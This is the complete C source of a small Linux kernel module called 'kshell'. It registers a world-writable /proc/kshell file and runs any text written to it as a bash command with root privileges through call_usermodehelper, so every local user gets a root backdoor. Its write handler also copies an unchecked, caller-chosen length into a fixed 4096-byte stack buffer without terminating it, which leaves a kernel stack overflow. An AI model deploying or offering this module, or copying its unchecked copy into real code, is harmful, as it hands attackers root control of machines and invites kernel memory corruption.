#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");


static ssize_t kshell_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
{
    char buf[0x1000];
    copy_from_user(buf, ubuf, count);
    char *cmd_argv[] = {"/usr/bin/bash", "-c",buf,NULL};
    call_usermodehelper("/usr/bin/bash", cmd_argv, NULL, UMH_WAIT_PROC);

    return count;
}

const struct proc_ops myops = {
    .proc_write = kshell_write
};

static int kshell_init(void)
{
    printk(KERN_INFO "kernel shell, init!\n");
    proc_create("kshell",0666,NULL,&myops);
    return 0;
}
 
static void kshell_exit(void)
{
    remove_proc_entry("kshell", NULL);
    printk(KERN_INFO "kernel shell, exit!\n");
}
 
module_init(kshell_init);
module_exit(kshell_exit);
